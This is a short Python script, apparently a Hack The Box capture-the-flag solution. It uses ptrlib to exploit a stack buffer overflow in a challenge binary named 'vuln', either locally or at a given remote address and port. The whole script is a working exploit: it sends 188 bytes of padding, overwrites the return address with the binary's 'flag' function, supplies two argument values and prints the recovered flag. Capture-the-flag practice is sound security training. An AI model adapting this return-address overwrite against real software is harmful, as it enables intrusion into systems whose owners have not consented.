#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./vuln")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("94.237.48.147", 38246)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl = b"A" * 188
    pl += ptr.p32(unwrap(exe.symbol("flag")))
    pl += b"A" * 4
    pl += ptr.p32(0xDEADBEEF)
    pl += ptr.p32(0xC0DED00D)
    io.sendline(pl)

    io.recvuntil("HTB")
    flag = "HTB" + io.recvuntil("}").decode()
    print(f'flag = {flag}')


if __name__ == "__main__":
    main()
